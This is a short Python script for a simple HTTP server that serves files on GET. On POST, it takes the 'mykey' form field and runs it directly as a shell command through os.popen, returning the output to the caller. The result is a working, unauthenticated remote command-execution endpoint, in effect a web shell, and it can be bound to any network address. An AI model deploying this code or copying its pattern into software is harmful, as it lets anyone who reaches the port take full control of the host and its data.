import http.server
import socketserver
import argparse
import os
from urllib import parse


class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = 'index.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        datalen = int(self.headers['Content-Length'])
        post_data = self.rfile.read(datalen).decode("utf-8")
        print("I received this data ->", post_data)
        payload_data = parse.parse_qs(post_data)["mykey"][0]
        print(payload_data)
        resp = self.run_shell_command(payload_data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(resp.encode("utf-8"))

    def run_shell_command(self, res):
        stream = os.popen(res)
        output = stream.read()
        return output


def run(host="localhost", port=8000):
    handler_object = MyHttpRequestHandler
    my_server = socketserver.TCPServer((host, port), handler_object)
    my_server.serve_forever()


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Run a simple HTTP server")

    parser.add_argument(
        "-l",
        "--listen",
        default="localhost",
        help="Specify the IP address on which the server listens",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=8000,
        help="Specify the port on which the server listens",
    )

    args = parser.parse_args()

    run(host=args.listen, port=args.port)
